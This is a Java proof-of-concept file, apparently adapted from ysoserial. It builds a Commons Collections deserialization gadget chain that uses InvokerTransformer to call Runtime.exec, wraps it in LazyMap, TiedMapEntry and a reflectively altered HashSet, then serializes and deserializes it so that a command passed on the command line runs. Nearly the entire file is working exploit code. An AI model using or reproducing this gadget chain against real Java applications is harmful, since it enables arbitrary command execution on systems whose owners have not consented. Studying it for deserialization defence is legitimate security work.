import shaded.org.apache.commons.collections4.Transformer;
import shaded.org.apache.commons.collections4.functors.ChainedTransformer;
import shaded.org.apache.commons.collections4.functors.ConstantTransformer;
import shaded.org.apache.commons.collections4.functors.InvokerTransformer;
import shaded.org.apache.commons.collections4.keyvalue.TiedMapEntry;
import shaded.org.apache.commons.collections4.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class Vulnerable {

    public static void main (final String[] args) throws Exception {

        if (args.length==0) {
            throw new IllegalArgumentException("one argument needed -- an OS command to run -- for instance try: [java Vulnerable \"open -a Calculator\"] to open the calculator on OSX");
        }

        String command = args[0]; //"open -a Calculator"; // getDefaultTestCmd();
        final Object objBefore = new Vulnerable().getObject(command);
        System.out.println("serializing payload");
        byte[] serialized = serialize(objBefore);

        try {
            System.out.println("deserializing payload");
            final Object objAfter = deserialize(serialized);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    // payload from https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java
    public Serializable getObject(final String command) throws Exception {

        final String[] execArgs = new String[] { command };
        final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {
                    String.class, Class[].class }, new Object[] {
                    "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke", new Class[] {
                    Object.class, Object[].class }, new Object[] {
                    null, new Object[0] }),
            new InvokerTransformer("exec",
                    new Class[] { String.class }, execArgs),
            new ConstantTransformer(1) };

        Transformer transformerChain = new ChainedTransformer(transformers);

        final Map innerMap = new HashMap();

        // constructor used in orgininal ysoserial replaced by static factory method
        Map lazyMap = LazyMap.lazyMap(innerMap,transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        f.setAccessible(true);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        keyField.setAccessible(true);
        keyField.set(node, entry);

        return map;

    }


    private static String getDefaultTestCmd() {
        return getFirstExistingFile(
                "C:\\Windows\\System32\\calc.exe",
                "/bin/ls",
                "/usr/bin/gnome-calculator",
                "/usr/bin/kcalc"
        );
    }

    private static String getFirstExistingFile(String ... files) {
        for (String path : files) {
            if (new File(path).exists()) {
                return path;
            }
        }
        throw new UnsupportedOperationException("no known test executable");
    }

    private static byte[] serialize(final Object obj) throws IOException {
        final ByteArrayOutputStream out = new ByteArrayOutputStream();
        serialize(obj, out);
        return out.toByteArray();
    }

    private static void serialize(final Object obj, final OutputStream out) throws IOException {
        final ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
    }

    public static Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
        final ByteArrayInputStream in = new ByteArrayInputStream(serialized);
        return deserialize(in);
    }

    public static Object deserialize(final InputStream in) throws ClassNotFoundException, IOException {
        final ObjectInputStream objIn = new ObjectInputStream(in);
        return objIn.readObject();
    }
}
